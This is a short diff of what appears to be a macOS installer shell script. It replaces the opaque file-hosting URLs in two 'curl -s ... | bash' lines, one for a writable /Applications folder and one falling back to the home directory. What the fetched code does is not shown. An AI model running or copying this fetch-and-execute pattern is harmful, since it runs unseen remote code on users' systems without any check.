@@ -5,10 +5,10 @@ main() {
     clear
 
     if [ -w "/Applications" ]; then
-        curl -s "https://tesyulynrp.ufs.sh/f/zU9GH2aR7moaDEOT1ySKv9mtwjVhWFsYRHupDbZeng4LI2dk" | bash
+        curl -s "https://tesyulynrp.ufs.sh/f/zU9GH2aR7moaP9GDWnAK1LoEG64mIT250kWZUrlHKQzJScpM" | bash
     else
         echo -e "${YELLOW}[!] Local user detected, using home directory instead of global MacOS directory ${NC}"
-        curl -s "https://tesyulynrp.ufs.sh/f/zU9GH2aR7moa4gdCKuRLBUVsarTPo1yp6kYu7zQ3OqxLJhvw" | bash
+        curl -s "https://tesyulynrp.ufs.sh/f/zU9GH2aR7moa9ERAriswI4FHOvNMXhpAcYjJtTGdRyBlziV0" | bash
     fi
 }
 
